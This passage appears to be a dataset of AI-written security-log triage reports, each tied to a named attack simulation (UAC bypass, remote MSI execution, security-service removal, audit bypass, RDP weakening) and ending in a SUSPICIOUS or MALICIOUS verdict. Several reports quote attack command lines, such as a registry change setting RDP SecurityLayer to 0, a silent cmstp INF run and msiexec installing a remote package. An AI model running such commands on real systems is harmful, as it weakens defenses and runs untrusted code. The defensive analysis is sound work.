   - Event ID 4672 represents a privilege escalation with multiple high-level privileges assigned to the user `admin_test`. This is suspicious, especially if not typical for this user.

3. **Sysmon Log**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` processes executed by `SERVER002\admin_test` are seen. This sequence suggests possible manipulation of event logs or viewing, which may indicate hiding of malicious activity.
   - The command `cmd.exe /c reg add ...` involves registry alteration to potentially weaken security configurations. This action is highly suspicious as it attempts to change CredSSP settings which might be used to facilitate man-in-the-middle attacks.
   - Repeated entries for `MicrosoftEdgeUpdate.exe` reflect typical browser update activities but should be verified for legitimacy when in conjunction with other suspicious activities.

4. **System Log**:
   - There is an unusual time change event sequence with precise revert and adjustment by a `svchost.exe` process, which could indicate tampering with system time to cover tracks or manipulate log timestamps.

**Conclusion**:
The combination of high-level privilege assignments without sufficient context, registry modifications weakening security protocols, and possible log manipulation activities signal suspicious behavior that could potentially be malicious in nature. The activities should be thoroughly investigated to determine if there is a legitimate explanation or if they are part of a malicious campaign.

**Resolution**: SUSPICIOUS

**Recommended Actions**:
- Further forensic investigation, including confirmation of user action legitimacy.
- Review user `admin_test` activity and permissions.
- Examine network traffic to identify external communications related to the suspicious behaviors.
- Audit system and application security configurations to determine any unauthorized changes."
Opening ports for proxy - HARDRAIN,"Upon analyzing the provided logs, the following observations and evaluations can be made:

1. **Repeated Usage of `wevtutil` and `conhost`**:
   - The logs show numerous instances of processes such as `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`.
   - `wevtutil.exe` is a legitimate utility used for managing Windows Event Logs, but it can be used to clear event logs, which is a behavior often associated with malicious activity to cover tracks.
   - However, in these entries, there are no indications of arguments or operations that suggest the logs were cleared or manipulated maliciously.

2. **Execution of Common Utilities (`hostname.exe`, `whoami.exe`)**:
   - Entries include execution of `hostname.exe` and `whoami.exe`. These are benign utilities that are used to display the system hostname and the current logged-in user, respectively.
   - The execution in itself is not indicative of malicious behavior.

3. **Suspicious Use of `cmd.exe` and `netsh.exe`**:
   - An entry shows `cmd.exe` executing a `netsh advfirewall` command to add a firewall rule that allows traffic on a specific TCP port (450).
   - The sudden addition of a firewall rule without context or justification can signify an attempt to open a backdoor for unauthorized access or data exfiltration, which is suspicious.

4. **Process Ownership and Integrity Levels**:
   - All observed processes are executed under the high integrity level by the `admin_test` user, which indicates that they were run with elevated privileges.
   - The associated integrity levels and the fact that these processes are executed from the System32 directory suggest they are trusted system processes, but a user with admin privilege executing these commands is suspicious.

5. **Time Source and System Adjustments**:
   - The logs indicate time synchronization activities with time.windows.com. This is normal system operation to ensure the system clock is accurate, indicating no direct malicious activity.

**Assessment**:
Overall, many of the activities observed in the logs (e.g., execution of certain utilities) can either be legitimate administrative actions or potentially malicious activities, especially given the suspicious firewall change observed. The firewall change allows inbound TCP connections on port 450, which is not standard and might be unnecessary without an explicit context. Moreover, any potential malicious actor could leverage this change for unauthorized access.

**Resolution**: **SUSPICIOUS** – The logs contain activity, particularly the unauthorized firewall rule addition, that is suspicious and warrants further investigation.

**Guidance**:
- **Further Investigation**: Verify with the `admin_test` user or the responsible party if these actions were legitimately conducted as part of maintenance or troubleshooting.
- **Network Monitoring**: Monitor network traffic for unusual activity, particularly concerning the newly allowed port 450.
- **Check for Persistence**: Review additional logs and system configurations for signs of unauthorized changes or persistence mechanisms.
- **Log Integrity Check**: Ensure event logs have not been cleared or tampered with and determine if additional logging or alerting is needed.
"
ProtocolHandler.exe Downloaded a Suspicious File,"**Detailed Analysis of Logs:**

1. **Application Logs:**
   - The only notable events are related to services stopping, specifically the `edgeupdate` service and the Microsoft-Windows-Security-SPP provider logging time correction info. These seem routine and show no signs of malicious activity.

2. **Sysmon Logs:**
   - Multiple sysmon events indicate normal activities related to `edgeupdate`, a legitimate Microsoft Edge update process, running as `NT AUTHORITY\SYSTEM`. The hashes and file paths are consistent with benign update activities.
   - However, there's an interesting entry where `cmd.exe` is executed with a complex command line involving registry queries and launching a protocol handler from a suspicious URL: `""https://raw.githubusercontent.com/file/file-file/master/files/data/src/dataTest.docx""`. This suggests potential downloading and execution of possibly malicious content.
   - `PowerShell.exe`, `conhost.exe`, `wevtutil.exe` are spawned under `admin_test`, but they appear to be connected to routine system activity. The command utilized by `cmd.exe` using a registry query followed by invoking a URL is typically suspicious, particularly given it uses environment specifics to potentially execute content from a remote source.

3. **Security and System Logs:**
   - Both the Security and System logs are notably devoid of entries that could provide further context on authentication or additional system changes that might highlight unauthorized access or intended privilege escalation.

**Assessment:**
- **Suspicious Activity Detected:** The operation involving `cmd.exe` querying registry paths, setting environment variables, and then attempting to use an external URL to call a protocol handler points to potentially malicious behavior. Such combined activities are often used in scenarios involving the installation of unauthorized software or malware, especially when driven by unexpected remote sources.

**Threats and Risks:**
- Potential downloading and executing unauthorized or harmful content from a remote URL might lead to system compromise, leakage of sensitive data, or unlawful control over the affected system.

**Recommended Actions:**
1. **Immediate Investigation:** Track the source of the `cmd.exe` command and verify if the external URL has legitimate use within the organization or if it's part of established test/sandbox processes. Investigate the user activities of `admin_test` for unauthorized access or actions.
2. **Review System Changes:** Check CRC or hash changes for system files, especially signed executables, against trusted sources to ensure they have not been altered.
3. **Network Monitoring and Isolation:** Monitor outbound network communications for unusual activity involving the URL or unexpected network destinations from this host. Consider isolating the machine if unusual high-risk activity persists.
4. **User and Device Assessment:** Evaluate endpoint and user behavior analytics to judge if this occurrence is anomalous for this system/user account.

**Resolution:** **SUSPICIOUS** - The actions observed require further investigation to determine the extent of potential compromise or authorization."
Bypass UAC using sdclt DelegateExecute,"Based on the analysis of the provided Windows event logs, here are the key observations and findings:

### 1. Security Log Analysis

- **Event ID 4624 (Logon Event)**: A logon event for the SYSTEM account using Logon Type 5, indicating a service startup. This is a routine event for system processes and typically not suspicious on its own.

- **Event ID 4672 (Special Privileges Assigned)**: The SYSTEM account is assigned special privileges (e.g., SeDebugPrivilege). This is expected for SYSTEM processes and isn't necessarily malicious by itself.

- **Event ID 4616 (Time Change)**: This indicates a change in the system time by the LOCAL SERVICE account. Although time changes can sometimes be suspicious, the sequence of events appears routine.

### 2. Application Log Analysis

- **Windows Defender State**: Repeated logs confirm that Windows Defender is active, which is a good indicator of SECURITY_PRODUCT_STATE_ON.

- **SPP and Edge Update Logs**: These logs represent routine updates and checks. No anomalies are observed here.

### 3. Windows PowerShell Log Analysis

- A PowerShell command is seen that involves manipulating Registry keys to run `cmd.exe /c notepad.exe`. This is likely to enable a potential persistence mechanism using `DelegateExecute`. The use of `sdclt.exe` indicates an attempt to bypass User Account Control (UAC).

### 4. System Log Analysis

- Events related to the Windows Time Service (Event ID 35) indicate a synchronization with a time source, which aligns with normal time service operations.

### 5. Sysmon Log Analysis

- **Process Creation**: Multiple instances of processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`, and others initiated by the `admin_test` account. The presence of `powershell.exe` with a suspicious command aligns with potential malicious script activity trying to establish persistence via Registry manipulations.

### Key Suspicious Findings:

- The PowerShell log entry marks a key suspicious activity as it modifies Registry settings in a way that could be used for persistence. The timing of this event coincides with the logs showing process activities by `admin_test`, suggesting potentially unauthorized actions.

### Conclusion:

- **Resolution: MALICIOUS**

The behavior observed, specifically the PowerShell activity aiming to bypass security controls and establish persistence, is strongly indicative of malicious intent. This suggests a compromise attempt using PowerShell to modify system settings persistently. The risk is high due to potential system-level access and privilege abuse.

### Guidance on How to Proceed:

1. **Isolate the Affected Host**: Immediately isolate the host from the network to prevent further propagation of any malicious activity.
   
2. **Conduct a Forensic Investigation**: Further analysis and forensics on the system’s state, user activity logs, and possibly memory dumps should be performed.

3. **Registry and File Integrity Check**: Verify and restore any unauthorized Registry changes, specifically within the shell open command context.

4. **Security Auditing and Monitoring**: Increase logging and monitoring for the `admin_test` account activities across all systems within the network.

5. **Patch and Remediate**: Ensure that all security updates are applied and review security settings, especially concerning PowerShell execution settings.

6. **Consider a Detailed Incident Response**: Engage the incident response team to assess the full scope of the intrusion and remediate accordingly.

The sequence of logs suggests coordinated actions that are consistent with a malicious script or actor operating with elevated privileges. The possible persistence mechanism using PowerShell as highlighted indicates intentional configuration changes to potentially sustain future access or control."
MSXSL Bypass using local files,"Upon analyzing the provided logs, I have identified several points that may indicate suspicious or unusual activity, demanding closer inspection:

1. **Security Logs**:
   - Multiple **EventID 4624** entries with LogonType 5 (`Service Logon`) associated with the `SYSTEM` account are typical, indicating service activities. However, these were repeatedly followed by **EventID 4672** (`Special privileges assigned to new logon`) with elevated privileges, suggesting an increase in privilege which could be normal for SYSTEM context but should be validated against expected service behaviors.
   - **EventID 5379** indicates failures with code 3221226021 (`STATUS_LOGON_FAILURE`), which implies failed read operations on certain credential types such as MicrosoftAccount, potentially linked to misconfigured accounts or unsuccessful login attempts.

2. **Sysmon Logs**:
   - The frequent use of `wevtutil.exe`, `cmd.exe`, and `powershell.exe` by `admin_test` suggests administrative or scripting activities. Specifically:
     - **PowerShell use** (EventID 5, ProcessId 1308) without visible command-line arguments could be harmless but is usually worth a deeper look for hidden script execution.
     - Continuous `wevtutil.exe` processes might indicate log manipulation or querying; check if these are scheduled tasks or administrative queries.
   - **EventID 1** highlights the use of `whoami.exe` and `hostname.exe`, which traditionally identify user and host details. This might be indicative of reconnaissance or auditing.
   - A notable entry is the `cmd.exe` launching `msxsl.exe`, which may potentially manipulate XML with an XSL script from temporary files, a known pattern sometimes used in malicious scripts or 'Living off the Land' attacks.

3. **Application Logs**:
   - Regular events indicating Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`) suggest that endpoint protection is functioning normally.

Based on the analysis above, the continual occurrences of credential reading failures, use of administrative tools, and peripheral invocation of potentially manipulative tasks indicate behavior that deviates from standard administrative activity but doesn't immediately confirm malicious intent.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Further investigation is warranted to understand the context of the `admin_test` user’s elevation activities and frequent PowerShell and log query usage. Checking for related scripts or tasks scheduled by this user can confirm intentions.
- Validate the purpose of failed read attempts and review account-related logs to determine any misconfiguration.
- Ensure no unsanctioned tasks are run using commands and scripts from temporary directories, as suggested by the usage of msxsl.exe with cmd.exe.

Thus, although distinct signs of malicious activity were not confirmed by these logs, some events warrant a closer examination to ensure they align with expected operations and security protocols."
CMSTP Executing UAC Bypass,"Upon analyzing the provided series of Windows event logs, several observations can be made:

### Analysis and Findings:

1. **Unusual Command Execution:**
   - A `cmd.exe` execution with `cmstp.exe` is noted, which is concerning. The command line `""cmd.exe"" /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003_script.inf"" /au` suggests an attempt to execute a CMSTP script in silent mode, which can be leveraged for malicious purposes as CMSTP can be used to bypass User Account Control (UAC).

2. **PowerShell Activity:**
   - The initiation of PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) is not detailed with command-line arguments within the Sysmon logs, but PowerShell execution is often scrutinized due to its powerful capabilities and potential use in executing scripts or malicious payloads.

3. **Processes Usage:**
   - A series of executions involving `wevtutil.exe` are observed. `wevtutil` can be used to manage and query event logs, potentially indicating that log tampering or data exfiltration activities might be attempted, but further context on its commands is needed.

4. **Logon Events:**
   - The logs indicate multiple privileged logons (`Event ID 4672`), with privileges such as `SeDebugPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege`, etc., being assigned to the 'admin_test' user.

5. **Security Events:**
   - Edge updates and installation activities were observed, which appear typical for software maintenance, generally benign unless correlated with other suspicious indicators such as executions resulting in privilege escalations or unwanted changes.

### Risk and Threat Assessment:
Despite normal-looking activity from routine system updates and user activities, the presence of CMSTP with a script execution makes this set of logs suspicious. CMSTP's ability to bypass security controls requires scrutiny, especially when combined with shell (cmd.exe) and other system utilities without full context (e.g., process parent-child relationships, data flow).

### Resolution:
- **Resolution: SUSPICIOUS**

### Guidance on Proceeding:
1. **Deep Dive Investigation:**
   - Conduct a deep dive into the process tree associated with the CMSTP command execution. Correlate the timeline of suspicious events and check for any anomalies or escalations following this activity.
   
2. **Examine Network and System Changes:**
   - Review any network communications emerging from the host post suspicious executions and examine the system for any changes post these logged activities.
   
3. **Look for Persistence Mechanisms:**
   - Investigate any attempts to establish persistence, especially with the use of tasks or scheduled updates that could align with these executions.
   
4. **User Validation:**
   - Confirm with the 'admin_test' account holder to verify legitimate usage during the timeframe of interest, in case of unintended delegation or abuse.

5. **Threat Intelligence Correlation:**
   - Utilize threat intelligence feeds to check hashes or command signatures against known malicious activity.

Based on these observations, while there's yet no concrete malicious confirmation, the pattern necessitates caution and warrants further investigation before determining the everything as benign."
Remove Network Share PowerShell,"Upon reviewing the provided logs from various categories (System, Application, Sysmon, Windows PowerShell, and Security), here is the detailed analysis of the activities noted in the logs:

### System Log Analysis
1. **Time Change Events**: Notable entries involving time-change events carried out by the process `svchost.exe` (Event ID 1 by `Microsoft-Windows-Kernel-General`). These entries are typically benign when changes are closely tied to system operations or network time synchronization.
   
2. **Windows Time Service**: The logs show the system synced time with `time.windows.com` (Event ID 35), which is a standard behavior for Windows time service operations.

### Application Log Analysis
1. **Edge Update Service**: The application logs show `edgeupdate` service stopped twice, but no further actions related to this process indicate unusual behavior. Service stopping can be routine as part of an update process.

### Sysmon Log Analysis
1. **Process Executions**: Multiple processes, such as `wevtutil.exe` and `powershell.exe`, are recorded without rule-based detections (`RuleName` is empty).
  
2. **PowerShell Activity**: A `PowerShell` script executing commands `Remove-SmbShare` and `Remove-FileShare` is logged. While the command isn't inherently malicious, it is notable because it changes network share configurations. Without additional context or unusual parameters, this might require further context to assess whether it was part of an administrative or management task.

3. **Hostname and WhoAmI Commands**: Executions of `hostname.exe` and `whoami.exe` are recorded. These commands help identify the system's name and the current user's details. Frequent usage without administrator context can be used in scripts for environment reconnaissance.

4. **EdgeUpdate Executions**: Frequent launch events for `MicrosoftEdgeUpdate.exe` are observed with different command-line options. However, they are typically part of the Edge update mechanism.

### Windows PowerShell Log Analysis
1. **PowerShell State Changes**: Logs indicate state changes and starting of providers related to `PowerShell` execution, showing typical logging for `PowerShell` script executions.

### Security Log Analysis
1. **Time Change Events**: Reiteration of time-change events in security logs under `Security-Auditing` with `svchost.exe`, aligning with system log records.

### Assessment
- **Suspicious Activity**: The execution of PowerShell scripts involving potential change in network shares (commands like `Remove-SmbShare`) is considered suspicious. It does not directly imply malicious behavior without more context, such as details about authorized administrative activities or intended system management tasks.
  
- **Benign Activity**: Time changes and Edge updates appear typical and align with standard system operations. No explicit evidence of privilege escalation or unforeseen process executions necessary suggests benign implications.

### Conclusion
The logs contain activity that warrants further investigation due to the PowerShell commands altering network shares. There isn't explicit malicious activity identified, but the potential impact and source of the PowerShell commands should be clarified to ensure network configurations are as expected and authorized.

**Resolution: SUSPICIOUS** - The behavior doesn’t immediately indicate a compromise or malicious intent, but it’s worth further investigation to rule out unauthorized actions. I would recommend checking:
- The source and authorization of the PowerShell commands.
- Any user or admin explanations for recent changes to network shares.
- Cross-reference with access control policies or change management records for context."
Stop and Remove Arbitrary Security Windows Service,"### Detailed Analysis of the Logs

Upon examining the provided Windows event logs across different channels (Application, Security, System, Sysmon, and Windows PowerShell logs), several key observations are made:

#### Application Logs
- **edgeupdate Events (EventID: 0):**
  - Repeated instances of ""edgeupdate"" service stopping at approximately the same time do not provide any clear indication of malicious behavior, but it's notable if unrelated services were expected to run.

#### Security Logs
- **EventID 4616:**
  - Events relating to time changes executed by the svchost.exe process. These could be legitimate system clock adjustments. However, abrupt time changes should be monitored for potential system manipulation tactics.
  
- **EventID 4624 & 4672:**
  - Successful logon attempts with elevated privileges were observed (NT AUTHORITY\SYSTEM). This is typically normal for system processes but should be accompanied by verifying if these align with expected system operations, particularly given the presence of high privileges.

#### System Logs
- **Time Service Synchronization & Kernel-General:**
  - Time-related events and synchronizations with `time.windows.com` point out routine time service activities. These are benign on their own unless paired with other critical unauthorized changes.

#### Sysmon Logs
- **Process Creation (EventID: 1 & 5):**
  - Presence of legitimate processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `svcchost.exe` indicates potentially normal operations unless intertwined with suspicious contexts or scripts.
  - **Critical Finding:** The execution of `powershell.exe` with the command line `Stop-Service -Name McAfeeDLPAgentService, Remove-Service -Name McAfeeDLPAgentService` is highly suspicious. This suggests an attempt to disable security software which is a common tactic used by malware to eliminate defenses.

#### Windows PowerShell Logs
- **PowerShell Host Application:**
  - Logs show the invocation of PowerShell with commands aimed at stopping and removing the McAfee DLP Agent Service. This strongly suggests malicious intent as disabling security solutions is a hallmark of malware or malicious actors seeking to avoid detection.

### Assessment and Conclusion
Based on the logs, the execution of PowerShell commands that attempt to disable McAfee security services stands out as a significant red flag indicating potentially malicious activity. Attempts to remove or stop critical security services like McAfee DLP Agent without legitimate authorized intention are a strong indicator of compromise.

### Resolution
**MALICIOUS** - The logs contain evidence of activity that aligns with known methods of disabling security tools by a malicious actor, often part of a larger attack strategy.

### Guidance on How to Proceed
1. **Immediate Containment:**
   - Isolate the affected Windows host from the network to prevent further potential spread or data exfiltration.
   
2. **Investigation:**
   - Conduct a detailed forensic analysis of the host to determine any further compromise and collect evidence of the attack vector used.
   - Review system and file integrity, looking for unauthorized changes or suspicious files.

3. **Remediation:**
   - Restore affected systems from a known good backup.
   - Re-enable and update security solutions like McAfee to latest definition and engine versions.

4. **Communication:**
   - Notify security operations and IT management about the incident.
   - Alert end-users to exercise caution and implement additional verification on service changes.

5. **Prevention:**
   - Review and adjust policies for PowerShell execution and the modification of security services.
   - Monitor similar activity changes in the environment for an extended period to ensure the threat has been fully mitigated."
Activate Windows NoSetTaskbar Group Policy Feature,"Upon reviewing the provided logs from the Windows host, the following analysis has been conducted:

### Security Logs:
1. There are events with EventID 4616 indicating that the system time was changed by the `LOCAL SERVICE` account using `svchost.exe`. Time change events from `LOCAL SERVICE` aren't typical for regular operations and could indicate tampering or timezone adjustments, but given the context, it just appears the system was synchronizing time via NTP.

### Application Logs:
1. The logs reflect services related to Microsoft Edge Update, with the service both stopping and starting. There is no irregular pattern or anomaly apparent merely from service-related start/stop activities in these logs.

### Sysmon Logs:
1. Frequent executions of `wevtutil.exe` and `conhost.exe` appear from the `SERVER002\admin_test` account. While `wevtutil.exe` is commonly used for exporting Windows event logs, its repeated usage should be examined further to ensure no unauthorized access or log tampering/confidentiality breach attempts.
   
2. A `cmd.exe` execution path shows a command for setting a registry key to disable taskbar settings indication (`NoSetTaskbar`). This registry modification could suggest an attempt to modify user environment settings inappropriately, which might be associated with malicious scripts or unauthorized administrative activities. 

3. `reg.exe` is launched with parameters related to registry manipulation, following the `cmd.exe` launch. Such activities might be part of a legitimate script but can also point to initial stages of persistence mechanisms or system manipulation by malware if not known to be operating under administrative supervision.

4. EdgeUpdate logs are prolific, showing multiple instances of `MicrosoftEdgeUpdate.exe` operations, including updates being initialized and registered. Given the logs provided, these don't indicate malicious activity by themselves but should be monitored for unusual network behavior or if accompanied by suspicious software installations.

### System Logs:
1. The system has time synchronization logs, but with the `LOCAL SERVICE` context involved, it's likely related to standard time service adjustments rather than something suspect.

### Conclusion:
The majority of the behavior seen, such as `HOSTNAME.EXE`, `whoami.exe`, and `MicrosoftEdgeUpdate.exe`, corresponds to expected operation scenarios of routine troubleshooting, user, and system activity logging efforts. However, the registry changes (`NoSetTaskbar`) and frequent `wevtutil.exe` usage necessitates further contextual investigation to ensure these actions are tied to legitimate administrative operations and not unsanctioned activity.

### Recommendation:
- Verify `SERVER002\admin_test` user account activities to ensure these are authorized actions.
- Ensure that the registry change aligns with organizational policy for the `NoSetTaskbar`.
- Audit logs for any repeated unusual `wevtutil.exe` executions regarding timestamps and accompanying system activities to limit the scope of any unauthorized access or tampering.
- Continue monitoring, specifically looking for potentially associated network or anomalous user account behaviors.

### Resolution:
- **SUSPICIOUS**: The activity, particularly involving registry changes and repeated event utility executions, does not look entirely benign and warrants further forensic analysis to determine legitimacy."
Indicator Manipulation using FSUtil,"Upon analyzing the provided Windows event logs, several activities are highlighted that may warrant further attention:

1. **Potential Privilege Escalation via `4672`:** 
   - Logs indicate that the user `admin_test` was granted special privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, `SeImpersonatePrivilege`, etc. These privileges can allow a user to perform sensitive system operations and are not typically granted unless necessary for a specific admin task. The presence of such privileges could be a sign of privilege escalation.

2. **Time Manipulation via Event `4616`:**
   - The system time was changed backwards briefly by the `svchost.exe`. Time modifications can be used by malware to evade detection but could also happen as part of legitimate admin activities.

3. **Unusual PowerShell Activity:**
   - The `PowerShell` logs record commands for file manipulation and content setting tasks within the `Temp` directory. This involves the creation of a file with a specified content and modifying it using `fsutil`. Abnormal use of such commands could be indicative of data staging or an attempt to manipulate files for malicious purposes.

4. **Suspicious Processes:**
   - Several instances of common tools like `hostname.exe`, `whoami.exe`, `svchost.exe` being executed using various parent processes, some linked to scripts and utilities (`wsmprovhost.exe`) that might be associated with management operations like Windows Remote Management. Additional correlation or context from network logs would assist to confirm the nature of the access.

5. **Edge Update Activity:**
   - Continuous `EdgeUpdate` service start and stop logs and executions of related processes. These might be benign (scheduled task updates), yet, considering the criticality of software updates, detailed scrutiny of the version and integrity of the executable paths could confirm legitimacy versus potential attempts to execute unauthorized applications under this guise.

### Conclusion and Recommendations

Based on the analysis of these logs alone, this activity warrants interest as potentially suspicious, falling within common procedures used by malicious actors in exploitation attempts such as privilege escalation, tampering via PowerShell, and masquerading binaries. 

**Resolution: SUSPICIOUS**

### Guidance for Further Investigation:
- **Privileges and User Actions:**
  - Verify the necessity and reasoning behind the privileges granted to `admin_test` and cross-reference with known profiles and jobs.
  
- **Correlate Time Changes:**
  - Check for user-initiated events or scheduled tasks that might explain time adjustments during system diagnostics or updates.

- **Examine PowerShell Logs Thoroughly:**
  - Look into script execution policies, active scripts, and verify the source and execution path integrity of known PowerShell instances.

- **Endpoint and Network Monitoring:**
  - Deploy additional monitoring on the endpoint to capture potential indicators of post-compromise activities like network connections, unexpected service creations, or binary executions.

- **Cross-reference with IAM Policies:**
  - Reassess and ensure minimal privilege principles are applied for service and administrative accounts in accordance with organizational policies.

Urgent attention towards these activities could reveal potential vectors of compromise or validate legitimate administrative incidents not yet documented."
Msiexec.exe - Execute Remote MSI file,"Upon reviewing the provided logs, I have identified several events that warrant attention as indicators of potential malicious activity:

### Observations:

1. **Msiexec and PowerShell Execution:**

   - **Event 17983 and 17984:** A `cmd.exe` instance executed `msiexec.exe` with a command to quietly install an MSI package from a URL hosted on GitHub. This is non-standard behavior reminiscent of downloading and executing potentially malicious scripts or applications from the web.

   - **Event 17985:** Following the msiexec installation, PowerShell was executed with a command that included `-nop -Command Write-Host JScript executed me!; exit`. The use of `-nop` (no profile) in PowerShell commands is a common tactic employed in malicious script execution to bypass execution policies.

2. **Sysmon Logs for PowerShell:**

   - **Events in PowerShell Log (1043-1050):** These entries indicate that the PowerShell script's execution was logged and included commands that could be indicative of a script execution after the download. The emitted message “JScript executed me!” could be construed as a custom script intended to signal an execution.

3. **Integrity Level and User Context:**

   - The various logs show processes running with ""High"" integrity levels under the admin_test user. While technically legitimate, such execution levels provide more significant system access and power, which can be exploited if misused.

### Potential Risks Identified:

- **Downloading and Executing Remote Scripts:** This sequence of operations - starting with downloading an MSI from an external source and subsequent PowerShell execution – is suspicious and could indicate attempts to execute potentially harmful software or scripts.
  
- **Command Execution Flags (`-nop`, Silent Installation):** The use of flags such as `-nop` in PowerShell and `/q` (silent mode) for installations suggests an effort to avoid user attention. 

### Assessment:

Based on the above analysis, there's a significant likelihood that these logs indicate scripting activity that is either highly irregular or outright malicious. It is possible that these actions are part of a broader attempt by an attacker to gain or maintain a foothold on the system via remote script execution.

### Resolution:
- **MALICIOUS:** The behavior captured in these logs, particularly the pattern of downloading and executing scripts without clear indication of legitimacy or purpose, strongly suggests a malicious intent. Immediate action is recommended.

### Recommended Actions:

1. **Immediately Isolate the Affected System:** Remove the machine from the network to prevent further potential spread or data exfiltration.

2. **Deep Malware Scan:** Conduct a comprehensive malware scan to identify any malicious files that may have been deployed.

3. **Network Traffic Review:** Check network traffic logs around the time of these events for any signs of data exfiltration or communication with known malicious domains or IPs.

4. **User and Process Audit:** Review the activities of the `admin_test` user account to determine if the account has been compromised or involved in anomalous activities.

5. **Review Recent Changes and Installs:** Inspect recently installed software and recent system changes that may have enabled this behavior, potentially due to this `msiexec` activity.

6. **Policy and Prevention Enhancements:** Evaluate and potentially tighten execution and installation policies to limit the possibility of such behaviors going unchecked."
Hidden Window,"Upon reviewing the provided logs from the Windows host, several indicators of potential activity worthy of closer scrutiny were identified:

1. **Windows PowerShell Execution**:
   - The PowerShell log indicates that a command was executed which starts a new PowerShell process with the command `Start-Process powershell.exe -WindowStyle hidden calc.exe`. This command hides the window of the new process it starts, which is often considered suspicious behavior. The launching of `calc.exe` (Calculator) itself isn't inherently malicious, but the method used suggests an attempt to conceal activity.
   - Another similar instance appears with `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe calc.exe`. The persistent use of PowerShell to execute processes in a concealed manner can be indicative of potential malicious exploitation or scripting.

2. **Sysmon Events**:
   - Multiple Sysmon logs capture processes related to PowerShell and follow with execution of `calc.exe`. They consistently show attempts to launch a process in a stealthy manner using PowerShell.

3. **Security and System Logs**:
   - Logs related to event ID 4616 show normal events regarding time synchronization, associated with `svchost.exe`, which is a common system process and not inherently suspicious on its own.

4. **Application Log**:
   - The entry from Software Protection Platform Service appears normal and related to licensing compliance and rules engine execution.

### Assessment:
- **Suspicious**: The execution of PowerShell commands to start another PowerShell process with the intent to keep it hidden (`-WindowStyle hidden`) stands out significantly. While `calc.exe` is a legitimate application, the method and repeated commands used imply potential misuse of PowerShell for executing scripts in a hidden manner that could indicate malicious intent or an attempt to probe or script-analyze the environment potentially in preparation for other actions.

### Recommendation:
- Further investigation into the origin of these PowerShell commands is recommended. It's crucial to determine who initiated these commands and whether they align with legitimate administrative tasks.
- Verify user `SERVER002\\admin_test` activity and privileges because most entries seem associated with this account.
- Consider conducting a deeper forensic analysis on this system for other abnormal activities, examine network traffic logs, and check for potential unauthorized access or scripts scheduled to run via task scheduler or persistence mechanisms typical of malware.

### Final Resolution:
- **SUSPICIOUS**"
Office 365 - Set Audit Bypass For a Mailbox,"Upon reviewing the provided Windows event logs, the key points and observations are as follows:

1. **Sysmon Logs**: 
   - There are numerous events indicating the execution of `powershell.exe` by the user `SERVER002\admin_test`.
   - Anomalies include the use of PowerShell to run commands that involve potentially sensitive operations, such as `Connect-ExchangeOnline` and `Set-MailboxAuditBypassAssociation`. These actions could be indicative of attempts to manipulate Exchange Online settings, which might allow for unauthorized access or data exfiltration if not properly secured.

2. **PowerShell Logs**: 
   - The PowerShell command involving connection to Exchange appears suspicious, primarily due to the bypass of audit settings (`Set-MailboxAuditBypassAssociation -AuditBypassEnabled $true`). Such activity is generally unusual for legitimate administrative tasks as it suppresses audit logs, potentially indicating malicious intent to hide actions.

3. **Application Logs**:
   - There doesn't appear to be any direct signs of concern within these logs. Most entries pertain to the usual operational logs of services.

4. **System Logs**:
   - Log entries primarily consist of Windows Update activities, which are standard processes on a system and do not indicate any known malicious activities.

5. **Potential Malicious Indicators**:
   - The usage of PowerShell commands to connect to Exchange Online and modify settings with audit bypass enabled is highly suspicious. This kind of behavior aligns with tactics seen in several cyber incidents where attackers disrupt logging and monitoring capabilities to avoid detection.

**Conclusion**:
Given the identified use of PowerShell to modify Exchange Online settings with the aim to bypass audit logging, this is a strong indicator of malicious activity intended to conceal actions on the system. This suggests the logs reflect a compromised system, potentially due to unauthorized access or insider threat activity.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately audit and secure all credentials used by the user account `SERVER002\admin_test`.
- Investigate any unauthorized access to sensitive data or configurations.
- Ensure all audit logging is restored and review all logs for additional suspicious activities.
- Consider isolating the affected systems to prevent further compromise and perform a thorough forensic analysis.
- Notify the necessary teams such as Incident Response and IT Security to contain and mitigate potential impacts.
"
Enabling Remote Desktop Protocol via Remote Registry,"### Analysis of Windows Event Logs

Upon analyzing the provided Sysmon log entries, some activities stand out that warrant a closer investigation:

1. **Excessive Use of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` are seen in rapid succession. This utility is commonly used to manage event logs and is legitimate under normal circumstances. However, excessive and rapid execution can indicate log tampering or data exfiltration attempts.

2. **Registry Modification with `cmd.exe`:**
   - The presence of `cmd.exe` executing a command with `reg.exe` to add or modify registry keys related to Remote Desktop Protocol (RDP) security settings is concerning. The specific command:
     ```
     reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f
     ```
     This command reduces the security layer of RDP connections, which could lower encryption requirements, potentially enabling man-in-the-middle attacks or unauthorized access.

3. **Execution of Known System Utilities:**
   - Processes like `hostname.exe`, `whoami.exe`, and `conhost.exe` are legitimate tools but can be used maliciously to gather system information or assist in further exploitation when combined with other suspicious activities.

4. **High Integrity Level and Admin Context:**
   - The actions, including the registry modification, occur under a high integrity level and under an admin context (`User`: SERVER002\admin_test). This suggests privileged access, making the behavior more impactful and potentially dangerous.

5. **Process Relationships:**
   - The logs demonstrate process spawning relationships that are somewhat typical (`conhost.exe` alongside command-line utilities), yet the context (wevtutil spam and registry manipulation) escalates suspicion.

### Assessment
Considering the evidence, the activities listed above present red flags that could indicate a malicious attempt to manipulate log files and change security settings on the system, potentially to cover tracks or establish a persistent unauthorized access mechanism.

### Resolution
- **SUSPICIOUS**: The logs contain activities that are unusual (frequent `wevtutil` usage and registry changes for RDP) and require further investigation to confirm intentions and origins. These could be part of administrative tasks under specific circumstances but without additional context (e.g., a change request or maintenance), they fall into a suspicious category.

### Guidance
1. **Immediate Actions:**
   - Notify the IT security team and consider isolating the system to prevent potential harm.
